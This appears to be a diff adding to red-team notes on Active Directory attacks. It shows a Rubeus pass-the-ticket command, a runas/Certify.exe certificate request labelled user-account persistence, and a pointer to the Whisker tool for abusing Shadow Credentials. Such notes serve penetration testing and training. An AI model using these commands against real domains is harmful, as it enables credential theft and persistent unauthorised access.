@@ -93,3 +93,12 @@ Rubeus.exe ptt /ticket:<ticket>
 ### Certifcate Exfiltration
 
 Sharpshare.exe - tool for domain share enumeration
+
+### User account persistence (PERSIST1) 
+  runas /netonly /user:certbulk\<accountname> "%LocalAppData%\Microsoft\WindowsApps\wt.exe"
+
+  Certify.exe request /ca:cb-ca.cb.corp\CB-CA /template:User /user:<accountname>
+
+### Shadow credentials
+
+Whisker (https://github.com/eladshamir/Whisker) aids red teams to abuse Shadow Credentials using the msDS-KeyCredentialLink attribute in red team operations.
